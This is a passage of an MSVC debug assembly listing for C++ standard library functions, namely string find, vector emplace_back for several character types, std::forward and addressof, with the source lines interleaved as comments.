; 607  :     if (_Needle_size > _Hay_size || _Start_at > _Hay_size - _Needle_size) {

	mov	rax, QWORD PTR _Hay_size$[rsp]
	cmp	QWORD PTR _Needle_size$[rsp], rax
	ja	SHORT $LN6@Traits_fin
	mov	rax, QWORD PTR _Needle_size$[rsp]
	mov	rcx, QWORD PTR _Hay_size$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	cmp	QWORD PTR _Start_at$[rsp], rax
	jbe	SHORT $LN5@Traits_fin
$LN6@Traits_fin:

; 608  :         // xpos cannot exist, report failure
; 609  :         // N4659 24.3.2.7.2 [string.find]/1 says:
; 610  :         // 1. _Start_at <= xpos
; 611  :         // 2. xpos + _Needle_size <= _Hay_size;
; 612  :         // therefore:
; 613  :         // 3. _Needle_size <= _Hay_size (by 2) (checked above)
; 614  :         // 4. _Start_at + _Needle_size <= _Hay_size (substitute 1 into 2)
; 615  :         // 5. _Start_at <= _Hay_size - _Needle_size (4, move _Needle_size to other side) (also checked above)
; 616  :         return static_cast<size_t>(-1);

	mov	rax, -1
	jmp	$LN1@Traits_fin
$LN5@Traits_fin:

; 617  :     }
; 618  : 
; 619  :     if (_Needle_size == 0) { // empty string always matches if xpos is possible

	cmp	QWORD PTR _Needle_size$[rsp], 0
	jne	SHORT $LN7@Traits_fin

; 620  :         return _Start_at;

	mov	rax, QWORD PTR _Start_at$[rsp]
	jmp	$LN1@Traits_fin
$LN7@Traits_fin:

; 621  :     }
; 622  : 
; 623  :     const auto _Possible_matches_end = _Haystack + (_Hay_size - _Needle_size) + 1;

	mov	rax, QWORD PTR _Needle_size$[rsp]
	mov	rcx, QWORD PTR _Hay_size$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR _Haystack$[rsp]
	lea	rax, QWORD PTR [rcx+rax*2+2]
	mov	QWORD PTR _Possible_matches_end$[rsp], rax

; 624  :     for (auto _Match_try = _Haystack + _Start_at;; ++_Match_try) {

	mov	rax, QWORD PTR _Haystack$[rsp]
	mov	rcx, QWORD PTR _Start_at$[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	QWORD PTR _Match_try$1[rsp], rax
	jmp	SHORT $LN4@Traits_fin
$LN2@Traits_fin:
	mov	rax, QWORD PTR _Match_try$1[rsp]
	add	rax, 2
	mov	QWORD PTR _Match_try$1[rsp], rax
$LN4@Traits_fin:

; 625  :         _Match_try = _Traits::find(_Match_try, static_cast<size_t>(_Possible_matches_end - _Match_try), *_Needle);

	mov	rax, QWORD PTR _Match_try$1[rsp]
	mov	rcx, QWORD PTR _Possible_matches_end$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	sar	rax, 1
	mov	r8, QWORD PTR _Needle$[rsp]
	mov	rdx, rax
	mov	rcx, QWORD PTR _Match_try$1[rsp]
	call	?find@?$_WChar_traits@_W@std@@SAPEB_WPEB_W_KAEB_W@Z ; std::_WChar_traits<wchar_t>::find
	mov	QWORD PTR _Match_try$1[rsp], rax

; 626  :         if (!_Match_try) { // didn't find first character; report failure

	cmp	QWORD PTR _Match_try$1[rsp], 0
	jne	SHORT $LN8@Traits_fin

; 627  :             return static_cast<size_t>(-1);

	mov	rax, -1
	jmp	SHORT $LN1@Traits_fin
$LN8@Traits_fin:

; 628  :         }
; 629  : 
; 630  :         if (_Traits::compare(_Match_try, _Needle, _Needle_size) == 0) { // found match

	mov	r8, QWORD PTR _Needle_size$[rsp]
	mov	rdx, QWORD PTR _Needle$[rsp]
	mov	rcx, QWORD PTR _Match_try$1[rsp]
	call	?compare@?$_WChar_traits@_W@std@@SAHQEB_W0_K@Z ; std::_WChar_traits<wchar_t>::compare
	test	eax, eax
	jne	SHORT $LN9@Traits_fin

; 631  :             return static_cast<size_t>(_Match_try - _Haystack);

	mov	rax, QWORD PTR _Haystack$[rsp]
	mov	rcx, QWORD PTR _Match_try$1[rsp]
	sub	rcx, rax
	mov	rax, rcx
	sar	rax, 1
	jmp	SHORT $LN1@Traits_fin
$LN9@Traits_fin:

; 632  :         }
; 633  :     }

	jmp	SHORT $LN2@Traits_fin
$LN1@Traits_fin:

; 634  : }

	add	rsp, 56					; 00000038H
	ret	0
??$_Traits_find@U?$char_traits@_W@std@@@std@@YA_KQEB_W_K101@Z ENDP ; std::_Traits_find<std::char_traits<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
this$ = 48
__formal$ = 56
??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1><>, COMDAT

; 1375 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??0?$allocator@D@std@@QEAA@XZ		; std::allocator<char>::allocator<char>
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??0?$_Vector_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ; std::_Vector_val<std::_Simple_types<char> >::_Vector_val<std::_Simple_types<char> >
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1><>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??$_Emplace_one_at_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z
_TEXT	SEGMENT
_My_data$ = 32
_Mylast$ = 40
this$ = 64
<_Val_0>$ = 72
??$_Emplace_one_at_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z PROC ; std::vector<char,std::allocator<char> >::_Emplace_one_at_back<char const &>, COMDAT

; 816  :     _CONSTEXPR20 _Ty& _Emplace_one_at_back(_Valty&&... _Val) {

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 817  :         // insert by perfectly forwarding into element at end, provide strong guarantee
; 818  :         auto& _My_data   = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 819  :         pointer& _Mylast = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 820  : 
; 821  :         if (_Mylast != _My_data._Myend) {

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rcx, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR [rcx+16]
	cmp	QWORD PTR [rax], rcx
	je	SHORT $LN2@Emplace_on

; 822  :             return _Emplace_back_with_unused_capacity(_STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEBD@std@@YAAEBDAEBD@Z	; std::forward<char const &>
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Emplace_back_with_unused_capacity@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z ; std::vector<char,std::allocator<char> >::_Emplace_back_with_unused_capacity<char const &>
	jmp	SHORT $LN1@Emplace_on
$LN2@Emplace_on:

; 823  :         }
; 824  : 
; 825  :         return *_Emplace_reallocate(_Mylast, _STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEBD@std@@YAAEBDAEBD@Z	; std::forward<char const &>
	mov	r8, rax
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z ; std::vector<char,std::allocator<char> >::_Emplace_reallocate<char const &>
$LN1@Emplace_on:

; 826  :     }

	add	rsp, 56					; 00000038H
	ret	0
??$_Emplace_one_at_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z ENDP ; std::vector<char,std::allocator<char> >::_Emplace_one_at_back<char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@AEBD@std@@YAAEBDAEBD@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBD@std@@YAAEBDAEBD@Z PROC			; std::forward<char const &>, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@AEBD@std@@YAAEBDAEBD@Z ENDP			; std::forward<char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??$emplace_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@QEAA?A_TAEBD@Z
_TEXT	SEGMENT
_Result$ = 32
this$ = 64
<_Val_0>$ = 72
??$emplace_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@QEAA?A_TAEBD@Z PROC ; std::vector<char,std::allocator<char> >::emplace_back<char const &>, COMDAT

; 902  :     _CONSTEXPR20 decltype(auto) emplace_back(_Valty&&... _Val) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 903  :         // insert by perfectly forwarding into element at end, provide strong guarantee
; 904  :         _Ty& _Result = _Emplace_one_at_back(_STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEBD@std@@YAAEBDAEBD@Z	; std::forward<char const &>
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Emplace_one_at_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z ; std::vector<char,std::allocator<char> >::_Emplace_one_at_back<char const &>
	mov	QWORD PTR _Result$[rsp], rax

; 905  : #if _HAS_CXX17
; 906  :         return _Result;
; 907  : #else // ^^^ _HAS_CXX17 ^^^ // vvv !_HAS_CXX17 vvv
; 908  :         (void) _Result;
; 909  : #endif // _HAS_CXX17
; 910  :     }

	add	rsp, 56					; 00000038H
	ret	0
??$emplace_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@QEAA?A_TAEBD@Z ENDP ; std::vector<char,std::allocator<char> >::emplace_back<char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Destroy_range@V?$allocator@D@std@@@std@@YAXPEADQEADAEAV?$allocator@D@0@@Z
_TEXT	SEGMENT
_First$ = 8
_Last$ = 16
_Al$ = 24
??$_Destroy_range@V?$allocator@D@std@@@std@@YAXPEADQEADAEAV?$allocator@D@0@@Z PROC ; std::_Destroy_range<std::allocator<char> >, COMDAT

; 944  : _CONSTEXPR20 void _Destroy_range(_Alloc_ptr_t<_Alloc> _First, const _Alloc_ptr_t<_Alloc> _Last, _Alloc& _Al) noexcept {

	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 945  :     // note that this is an optimization for debug mode codegen; in release mode the BE removes all of this
; 946  :     using _Ty = typename _Alloc::value_type;
; 947  :     if constexpr (!conjunction_v<is_trivially_destructible<_Ty>, _Uses_default_destroy<_Alloc, _Ty*>>) {
; 948  :         for (; _First != _Last; ++_First) {
; 949  :             allocator_traits<_Alloc>::destroy(_Al, _Unfancy(_First));
; 950  :         }
; 951  :     }
; 952  : }

	ret	0
??$_Destroy_range@V?$allocator@D@std@@@std@@YAXPEADQEADAEAV?$allocator@D@0@@Z ENDP ; std::_Destroy_range<std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
this$ = 48
__formal$ = 56
??$?0$$V@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1>::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1><>, COMDAT

; 1375 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??0?$allocator@E@std@@QEAA@XZ		; std::allocator<unsigned char>::allocator<unsigned char>
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??0?$_Vector_val@U?$_Simple_types@E@std@@@std@@QEAA@XZ ; std::_Vector_val<std::_Simple_types<unsigned char> >::_Vector_val<std::_Simple_types<unsigned char> >
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??$?0$$V@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1>::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1><>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??$_Emplace_one_at_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z
_TEXT	SEGMENT
_My_data$ = 32
_Mylast$ = 40
this$ = 64
<_Val_0>$ = 72
??$_Emplace_one_at_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_one_at_back<unsigned char const &>, COMDAT

; 816  :     _CONSTEXPR20 _Ty& _Emplace_one_at_back(_Valty&&... _Val) {

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 817  :         // insert by perfectly forwarding into element at end, provide strong guarantee
; 818  :         auto& _My_data   = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 819  :         pointer& _Mylast = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 820  : 
; 821  :         if (_Mylast != _My_data._Myend) {

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rcx, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR [rcx+16]
	cmp	QWORD PTR [rax], rcx
	je	SHORT $LN2@Emplace_on

; 822  :             return _Emplace_back_with_unused_capacity(_STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEBE@std@@YAAEBEAEBE@Z	; std::forward<unsigned char const &>
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Emplace_back_with_unused_capacity@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_back_with_unused_capacity<unsigned char const &>
	jmp	SHORT $LN1@Emplace_on
$LN2@Emplace_on:

; 823  :         }
; 824  : 
; 825  :         return *_Emplace_reallocate(_Mylast, _STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEBE@std@@YAAEBEAEBE@Z	; std::forward<unsigned char const &>
	mov	r8, rax
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_reallocate<unsigned char const &>
$LN1@Emplace_on:

; 826  :     }

	add	rsp, 56					; 00000038H
	ret	0
??$_Emplace_one_at_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_one_at_back<unsigned char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@AEBE@std@@YAAEBEAEBE@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBE@std@@YAAEBEAEBE@Z PROC			; std::forward<unsigned char const &>, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@AEBE@std@@YAAEBEAEBE@Z ENDP			; std::forward<unsigned char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??$emplace_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@QEAA?A_TAEBE@Z
_TEXT	SEGMENT
_Result$ = 32
this$ = 64
<_Val_0>$ = 72
??$emplace_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@QEAA?A_TAEBE@Z PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::emplace_back<unsigned char const &>, COMDAT

; 902  :     _CONSTEXPR20 decltype(auto) emplace_back(_Valty&&... _Val) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 903  :         // insert by perfectly forwarding into element at end, provide strong guarantee
; 904  :         _Ty& _Result = _Emplace_one_at_back(_STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEBE@std@@YAAEBEAEBE@Z	; std::forward<unsigned char const &>
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Emplace_one_at_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_one_at_back<unsigned char const &>
	mov	QWORD PTR _Result$[rsp], rax

; 905  : #if _HAS_CXX17
; 906  :         return _Result;
; 907  : #else // ^^^ _HAS_CXX17 ^^^ // vvv !_HAS_CXX17 vvv
; 908  :         (void) _Result;
; 909  : #endif // _HAS_CXX17
; 910  :     }

	add	rsp, 56					; 00000038H
	ret	0
??$emplace_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@QEAA?A_TAEBE@Z ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::emplace_back<unsigned char const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
this$ = 48
__formal$ = 56
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1><>, COMDAT

; 1375 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??0?$allocator@_W@std@@QEAA@XZ		; std::allocator<wchar_t>::allocator<wchar_t>
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??0?$_Vector_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_Vector_val<std::_Simple_types<wchar_t> >::_Vector_val<std::_Simple_types<wchar_t> >
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1><>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??$_Emplace_one_at_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z
_TEXT	SEGMENT
_My_data$ = 32
_Mylast$ = 40
this$ = 64
<_Val_0>$ = 72
??$_Emplace_one_at_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_one_at_back<wchar_t const &>, COMDAT

; 816  :     _CONSTEXPR20 _Ty& _Emplace_one_at_back(_Valty&&... _Val) {

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 817  :         // insert by perfectly forwarding into element at end, provide strong guarantee
; 818  :         auto& _My_data   = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 819  :         pointer& _Mylast = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 820  : 
; 821  :         if (_Mylast != _My_data._Myend) {

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rcx, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR [rcx+16]
	cmp	QWORD PTR [rax], rcx
	je	SHORT $LN2@Emplace_on

; 822  :             return _Emplace_back_with_unused_capacity(_STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEB_W@std@@YAAEB_WAEB_W@Z	; std::forward<wchar_t const &>
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Emplace_back_with_unused_capacity@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_back_with_unused_capacity<wchar_t const &>
	jmp	SHORT $LN1@Emplace_on
$LN2@Emplace_on:

; 823  :         }
; 824  : 
; 825  :         return *_Emplace_reallocate(_Mylast, _STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEB_W@std@@YAAEB_WAEB_W@Z	; std::forward<wchar_t const &>
	mov	r8, rax
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_reallocate<wchar_t const &>
$LN1@Emplace_on:

; 826  :     }

	add	rsp, 56					; 00000038H
	ret	0
??$_Emplace_one_at_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_one_at_back<wchar_t const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$forward@AEB_W@std@@YAAEB_WAEB_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEB_W@std@@YAAEB_WAEB_W@Z PROC		; std::forward<wchar_t const &>, COMDAT

; 1411 :     remove_reference_t<_Ty>& _Arg) noexcept { // forward an lvalue as either an lvalue or an rvalue

	mov	QWORD PTR [rsp+8], rcx

; 1412 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1413 : }

	ret	0
??$forward@AEB_W@std@@YAAEB_WAEB_W@Z ENDP		; std::forward<wchar_t const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??$emplace_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?A_TAEB_W@Z
_TEXT	SEGMENT
_Result$ = 32
this$ = 64
<_Val_0>$ = 72
??$emplace_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?A_TAEB_W@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::emplace_back<wchar_t const &>, COMDAT

; 902  :     _CONSTEXPR20 decltype(auto) emplace_back(_Valty&&... _Val) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 903  :         // insert by perfectly forwarding into element at end, provide strong guarantee
; 904  :         _Ty& _Result = _Emplace_one_at_back(_STD forward<_Valty>(_Val)...);

	mov	rcx, QWORD PTR <_Val_0>$[rsp]
	call	??$forward@AEB_W@std@@YAAEB_WAEB_W@Z	; std::forward<wchar_t const &>
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Emplace_one_at_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_one_at_back<wchar_t const &>
	mov	QWORD PTR _Result$[rsp], rax

; 905  : #if _HAS_CXX17
; 906  :         return _Result;
; 907  : #else // ^^^ _HAS_CXX17 ^^^ // vvv !_HAS_CXX17 vvv
; 908  :         (void) _Result;
; 909  : #endif // _HAS_CXX17
; 910  :     }

	add	rsp, 56					; 00000038H
	ret	0
??$emplace_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?A_TAEB_W@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::emplace_back<wchar_t const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$addressof@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_Vector_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_Vector_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z PROC ; std::addressof<std::_Vector_val<std::_Simple_types<wchar_t> > >, COMDAT

; 252  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 253  :     return __builtin_addressof(_Val);

	mov	rax, QWORD PTR _Val$[rsp]

; 254  : }

	ret	0
??$addressof@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_Vector_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ENDP ; std::addressof<std::_Vector_val<std::_Simple_types<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\iterator
;	COMDAT ?failed@?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
